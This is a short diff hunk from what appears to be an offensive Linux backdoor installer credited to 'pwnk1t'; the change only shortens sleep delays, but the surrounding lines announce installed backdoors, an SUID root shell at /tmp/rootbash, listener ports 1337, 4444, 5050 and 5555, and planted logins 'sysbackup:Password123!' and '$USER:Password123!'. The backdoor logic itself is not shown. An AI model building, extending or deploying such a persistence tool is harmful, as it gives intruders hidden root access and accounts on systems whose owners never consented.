@@ -143,17 +143,17 @@ sleep 1
 ################################
 
 echo "[+] Backdoors installed"
-sleep 1 
+sleep 0.8 
 echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
-sleep 1
+sleep 0.8
 echo "[!] Open listeners:"
-sleep 1
+sleep 0.8
 echo -e "\033[96m[+] 1337 4444 5050 5555\033[0m"
-sleep 1
+sleep 0.8
 echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
-sleep 1 
+sleep 0.8 
 echo -e "\033[96m[+] Login with $USER:Password123!\033[0m"
-sleep 1
+sleep 0.8
 echo "[*]  clean up..."
 sleep 1 
 echo "[💀] created by pwnk1t [💀]"
